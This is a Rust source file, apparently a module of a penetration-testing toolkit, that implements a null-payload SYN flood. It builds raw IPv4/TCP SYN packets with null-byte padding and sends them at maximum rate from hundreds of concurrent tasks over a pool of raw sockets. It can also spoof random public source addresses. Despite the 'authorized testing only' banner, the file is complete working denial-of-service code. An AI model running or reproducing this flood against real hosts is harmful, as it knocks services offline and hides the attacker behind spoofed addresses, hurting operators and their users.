//! Null SYN Exhaustion Testing Module
//!
//! Opens concurrent SYN connections sending null-byte streams for resource exhaustion testing.
//! FOR AUTHORIZED TESTING ONLY.

use anyhow::{anyhow, Context, Result};
use colored::*;
use pnet_packet::ip::IpNextHeaderProtocols;
use pnet_packet::ipv4::{self, MutableIpv4Packet};
use pnet_packet::tcp::{self, MutableTcpPacket, TcpFlags};
use rand::Rng;
use socket2::{Domain, Protocol, Socket, Type};
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Semaphore;
use tokio::time::Instant;
use crate::utils::{
    normalize_target, prompt_default, prompt_port, prompt_required, prompt_yes_no,
};

/// Configuration for the exhaustion test
#[derive(Clone, Debug)]
struct ExhaustionConfig {
    target_ip: Ipv4Addr,
    target_port: u16,
    source_port: Option<u16>,
    use_random_source_ip: bool,
    concurrent_streams: usize,
    duration_secs: u64,
    interval_mode: IntervalMode,
    payload_size: usize,
    socket_pool_size: usize,
    verbose: bool,
}

#[derive(Clone, Debug)]
enum IntervalMode {
    Zero,           // Max speed, no delay
    Delay(u64),     // Delay in milliseconds
}

/// Entry point for the module
pub async fn run(initial_target: &str) -> Result<()> {
    display_banner();
    
    let config = gather_config(initial_target).await?;
    execute_exhaustion(&config).await
}

fn display_banner() {
    println!("{}", r#"
╔══════════════════════════════════════════════════════════════╗
║   Null SYN Exhaustion Testing Module                         ║
║   FOR AUTHORIZED TESTING ONLY                                ║
╚══════════════════════════════════════════════════════════════╝
"#.red().bold());
}

async fn gather_config(initial_target: &str) -> Result<ExhaustionConfig> {
    println!("{}", "=== Configuration ===".bold());
    
    // Target IP
    let target_input = if initial_target.trim().is_empty() {
        prompt_required("Target IP")?
    } else {
        println!("{}", format!("[*] Using target: {}", initial_target).cyan());
        initial_target.to_string()
    };
    
    let normalized = normalize_target(&target_input)?;
    let target_ip: Ipv4Addr = normalized.parse()
        .map_err(|_| anyhow!("Target must be a valid IPv4 address (IPv6 not supported for raw packets)"))?;
    
    // Target Port
    let target_port = prompt_port("Target port", 80)?;
    
    // Source Port (optional)
    let src_port_input = prompt_default("Source port (blank for random)", "")?;
    let source_port = if src_port_input.is_empty() {
        None
    } else {
        Some(src_port_input.parse::<u16>()
            .map_err(|_| anyhow!("Invalid source port"))?)
    };
    
    // Random Source IP
    let use_random_source_ip = prompt_yes_no("Use random (spoofed) source IPs? (requires root)", false)?;
    
    // Concurrent Streams
    let streams_input = prompt_default("Number of concurrent streams", "100")?;
    let concurrent_streams: usize = streams_input.parse()
        .map_err(|_| anyhow!("Invalid number"))?;
    
    if concurrent_streams == 0 {
        return Err(anyhow!("Concurrent streams must be > 0"));
    }
    
    // Duration
    let duration_input = prompt_required("Test duration (seconds)")?;
    let duration_secs: u64 = duration_input.parse()
        .map_err(|_| anyhow!("Invalid duration"))?;
    
    if duration_secs == 0 {
        return Err(anyhow!("Duration must be > 0"));
    }
    
    // Interval Mode
    let zero_interval = prompt_yes_no("Use zero interval (max speed)?", true)?;
    let interval_mode = if zero_interval {
        IntervalMode::Zero
    } else {
        let delay_input = prompt_default("Delay between packets (ms)", "10")?;
        let delay: u64 = delay_input.parse().map_err(|_| anyhow!("Invalid delay"))?;
        IntervalMode::Delay(delay)
    };
    
    // Payload Size
    let payload_input = prompt_default("Null-byte payload size", "1024")?;
    let mut payload_size: usize = payload_input.parse()
        .map_err(|_| anyhow!("Invalid payload size"))?;
    
    // Cap payload size to prevent panic (65535 - 20 IP - 20 TCP = 65495)
    if payload_size > 65495 {
        println!("{}", "[!] Warning: Payload capped at 65495 bytes (IPv4 Max)".yellow());
        payload_size = 65495;
    }



    let verbose = prompt_yes_no("Verbose output (print errors)?", false)?;

    // Socket Pool Size
    let pool_input = prompt_default("Socket pool size (sharding)", "8")?;
    let mut socket_pool_size: usize = pool_input.parse()
        .map_err(|_| anyhow!("Invalid pool size"))?;
    
    if socket_pool_size == 0 {
        socket_pool_size = 1;
    }
    
    // Summary
    println!("\n{}", "=== Test Configuration ===".bold());
    println!("  Target: {}:{}", target_ip, target_port);
    println!("  Source Port: {}", source_port.map(|p| p.to_string()).unwrap_or_else(|| "random".to_string()));
    println!("  Random Source IP: {}", if use_random_source_ip { "yes" } else { "no" });
    println!("  Concurrent Streams: {}", concurrent_streams);
    println!("  Duration: {}s", duration_secs);
    println!("  Interval: {:?}", interval_mode);
    println!("  Payload Size: {} bytes", payload_size);
    println!("  Socket Pool: {} sockets", socket_pool_size);
    
    if !prompt_yes_no("\nProceed with test?", true)? {
        return Err(anyhow!("Test cancelled by user"));
    }
    
    Ok(ExhaustionConfig {
        target_ip,
        target_port,
        source_port,
        use_random_source_ip,
        concurrent_streams,
        duration_secs,
        interval_mode,
        payload_size,
        socket_pool_size,
        verbose,
    })
}

async fn execute_exhaustion(config: &ExhaustionConfig) -> Result<()> {
    println!("\n{}", "[*] Starting Null SYN Exhaustion test...".yellow().bold());
    
    let stop_flag = Arc::new(AtomicBool::new(false));
    let packets_sent = Arc::new(AtomicU64::new(0));
    let bytes_sent = Arc::new(AtomicU64::new(0));
    
    // Resource-efficient: limit concurrent workers with semaphore
    // Use a reasonable limit to avoid FD exhaustion
    let max_concurrent = config.concurrent_streams.min(500);
    let semaphore = Arc::new(Semaphore::new(max_concurrent));
    
    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration_secs);
    
    // Spawn stats printer
    let stats_stop = stop_flag.clone();
    let stats_packets = packets_sent.clone();
    let stats_bytes = bytes_sent.clone();
    let stats_handle = tokio::spawn(async move {
        while !stats_stop.load(Ordering::Relaxed) {
            tokio::time::sleep(Duration::from_secs(1)).await;
            let pkts = stats_packets.load(Ordering::Relaxed);
            let bytes = stats_bytes.load(Ordering::Relaxed);
            print!("\r{}", format!(
                "[*] Packets: {} | Bytes: {} KB | Rate: {:.1} pkt/s",
                pkts,
                bytes / 1024,
                pkts as f64 / start_time.elapsed().as_secs_f64()
            ).dimmed());
            let _ = std::io::Write::flush(&mut std::io::stdout());
        }
    });
    
    // Spawn worker streams
    let mut handles = Vec::new();
    
    // Create a pool of shared raw sockets
    // This allows utilizing multiple kernel queues/locks while avoiding one-per-stream overhead
    let socket_pool_size = config.socket_pool_size;
    let mut sockets = Vec::with_capacity(socket_pool_size);
    
    for _ in 0..socket_pool_size {
        let sock = Socket::new(
            Domain::IPV4,
            Type::RAW,
            Some(Protocol::from(libc::IPPROTO_RAW)),
        ).context("Failed to create raw socket")?;
        
        sock.set_header_included_v4(true)
            .context("Failed to set IP_HDRINCL")?;
            
        sockets.push(Arc::new(sock));
    }
    
    // Share the pool as Arc<Vec<Arc<Socket>>>? No, just clone from the Vec needed for each task.
    // We can just keep the Vec of Arcs.

    for stream_id in 0..config.concurrent_streams {
        let config = config.clone();
        let sem = semaphore.clone();
        let stop = stop_flag.clone();
        let pkts = packets_sent.clone();
        let bts = bytes_sent.clone();
        
        // Round-robin distribution of sockets from the pool
        let socket_shared = sockets[stream_id % socket_pool_size].clone();
        
        let handle = tokio::spawn(async move {
            // Acquire permit (blocks if too many concurrent)
            let _permit = match sem.acquire().await {
                Ok(p) => p,
                Err(_) => return,
            };
            
            if let Err(e) = run_stream(stream_id, &config, stop, pkts, bts, start_time, duration, socket_shared).await {
                // Check specifically for permissions
                let err_str = e.to_string();
                if err_str.contains("Permission denied") || err_str.contains("EPERM") || err_str.contains("Operation not permitted") {
                    eprintln!("\n{}", "[!] Root privileges required for raw sockets. Run with sudo.".red().bold());
                } else if config.verbose {
                     eprintln!("\n[!] Stream {} error: {}", stream_id, e);
                }
            }
        });
        
        handles.push(handle);
    }
    
    // Wait for duration
    tokio::time::sleep(duration).await;
    
    // Signal stop
    stop_flag.store(true, Ordering::Relaxed);
    
    // Wait for workers
    for handle in handles {
        let _ = handle.await;
    }
    
    stats_handle.abort();
    
    // Final stats
    let total_pkts = packets_sent.load(Ordering::Relaxed);
    let total_bytes = bytes_sent.load(Ordering::Relaxed);
    let elapsed = start_time.elapsed();
    
    println!("\n\n{}", "=== Test Complete ===".green().bold());
    println!("  Duration: {:.2}s", elapsed.as_secs_f64());
    println!("  Total Packets: {}", total_pkts);
    println!("  Total Data: {} KB", total_bytes / 1024);
    println!("  Avg Rate: {:.1} pkt/s", total_pkts as f64 / elapsed.as_secs_f64());
    
    Ok(())
}

async fn run_stream(
    _stream_id: usize,
    config: &ExhaustionConfig,
    stop: Arc<AtomicBool>,
    packets: Arc<AtomicU64>,
    bytes: Arc<AtomicU64>,
    start: Instant,
    duration: Duration,
    socket: Arc<Socket>,
) -> Result<()> {
    // Pre-allocate buffer for Zero-Copy/Reuse
    // IP Header (20) + TCP Header (20) + Payload
    const IPV4_HEADER_LEN: usize = 20;
    const TCP_HEADER_LEN: usize = 20;
    let total_len = IPV4_HEADER_LEN + TCP_HEADER_LEN + config.payload_size;
    let mut packet_buffer = vec![0u8; total_len];
    
    // Pre-fill null payload (it's always nulls, so just 0s which vec already is)
    // We only need to write headers dynamicially.

    while !stop.load(Ordering::Relaxed) && start.elapsed() < duration {
        // Generate source IP
        let src_ip = if config.use_random_source_ip {
            generate_random_ipv4()
        } else {
            get_local_ipv4().unwrap_or_else(|| Ipv4Addr::new(127, 0, 0, 1))
        };
        
        // Generate source port
        let src_port = config.source_port.unwrap_or_else(|| {
            rand::rng().random_range(49152..=65535)
        });
        
        // Craft and send SYN packet with null payload
        // Craft and send SYN packet using pre-allocated buffer
        match build_and_send_syn(&socket, src_ip, src_port, config.target_ip, config.target_port, &mut packet_buffer) {
            Ok(sent) => {
                packets.fetch_add(1, Ordering::Relaxed);
                bytes.fetch_add(sent as u64, Ordering::Relaxed);
            }
            Err(e) => {
                if config.verbose {
                    // Reduce noise, only print occasional errors or if significant
                    if rand::rng().random_bool(0.01) {
                         eprintln!("\n[!] Send error: {}", e);
                    }
                }
            }
        }
        
        // Apply interval delay
        match &config.interval_mode {
            IntervalMode::Zero => {
                // Yield to allow other tasks
                tokio::task::yield_now().await;
            }
            IntervalMode::Delay(ms) => {
                tokio::time::sleep(Duration::from_millis(*ms)).await;
            }
        }
    }
    
    Ok(())
}

fn build_and_send_syn(
    socket: &Socket,
    src_ip: Ipv4Addr,
    src_port: u16,
    dst_ip: Ipv4Addr,
    dst_port: u16,
    buffer: &mut [u8],
) -> Result<usize> {
    const IPV4_HEADER_LEN: usize = 20;
    // Buffer is already sized IP+TCP+Payload
    
    // We split buffer into IP and TCP parts manually because MutableX structures wrap the whole slice usually
    // But pnet API is a bit specific. socket expects IP header + TCP header + Payload.
    
    // 1. Construct TCP Header first (computationally) to compute checksum
    // Note: pnet's MutableTcpPacket expects a buffer of exact size? No.
    // We need to pointer arithmetic effectively.
    
    let total_len = buffer.len();
    
    // Slice for TCP part (IP header is first 20 bytes)
    let tcp_slice = &mut buffer[IPV4_HEADER_LEN..];
    
    {
        let mut tcp_pkt = MutableTcpPacket::new(tcp_slice)
            .ok_or_else(|| anyhow!("Failed to create TCP packet"))?;
        
        let seq_num: u32 = rand::rng().random();
        
        tcp_pkt.set_source(src_port);
        tcp_pkt.set_destination(dst_port);
        tcp_pkt.set_sequence(seq_num);
        tcp_pkt.set_acknowledgement(0);
        tcp_pkt.set_data_offset(5);
        tcp_pkt.set_flags(TcpFlags::SYN);
        tcp_pkt.set_window(65535);
        tcp_pkt.set_urgent_ptr(0);
        
        // Payload is already there (0s), effectively set by reuse. 
        // We assume buffer was init with 0s. 
        // If we wanted dynamic payload we'd copy it here.
        // For null-byte scan, it stays 0.
        
        // Checksum
        let tcp_immutable = tcp_pkt.to_immutable();
        let checksum = tcp::ipv4_checksum(&tcp_immutable, &src_ip, &dst_ip);
        tcp_pkt.set_checksum(checksum);
    }
    
    // 2. Construct IP Header
    {
        // Wrap the whole buffer for IP packet
        let mut ip_pkt = MutableIpv4Packet::new(buffer)
            .ok_or_else(|| anyhow!("Failed to create IP packet"))?;
        
        let ip_id: u16 = rand::rng().random();
        
        ip_pkt.set_version(4);
        ip_pkt.set_header_length(5);
        ip_pkt.set_total_length(total_len as u16);
        ip_pkt.set_identification(ip_id);
        ip_pkt.set_ttl(64);
        ip_pkt.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_pkt.set_source(src_ip);
        ip_pkt.set_destination(dst_ip);
        ip_pkt.set_flags(ipv4::Ipv4Flags::DontFragment);
        
        // Payload for IP packet is the TCP packet we just wrote?
        // MutableIpv4Packet doesn't overwrite payload unless we tell it to.
        // We just set headers. 
        
        ip_pkt.set_checksum(ipv4::checksum(&ip_pkt.to_immutable()));
    }
    
    // Send
    let dst_addr = SocketAddr::new(IpAddr::V4(dst_ip), 0);
    // socket is Arc<Socket> but Send works on &Socket
    let sent = socket.send_to(buffer, &dst_addr.into())
        .context("Failed to send packet")?;
    
    Ok(sent)
}

fn generate_random_ipv4() -> Ipv4Addr {
    let mut rng = rand::rng();
    loop {
        let a: u8 = rng.random_range(1..=254);
        let b: u8 = rng.random();
        let c: u8 = rng.random();
        let d: u8 = rng.random_range(1..=254);
        
        // Avoid private/reserved ranges
        if a == 10 || a == 127 || (a == 172 && (16..=31).contains(&b)) || (a == 192 && b == 168) {
            continue;
        }
        
        return Ipv4Addr::new(a, b, c, d);
    }
}

fn get_local_ipv4() -> Option<Ipv4Addr> {
    // Try to get local IP by connecting to a known address
    use std::net::UdpSocket;
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.connect("8.8.8.8:80").ok()?;
    let addr = socket.local_addr().ok()?;
    match addr.ip() {
        IpAddr::V4(ip) => Some(ip),
        _ => None,
    }
}
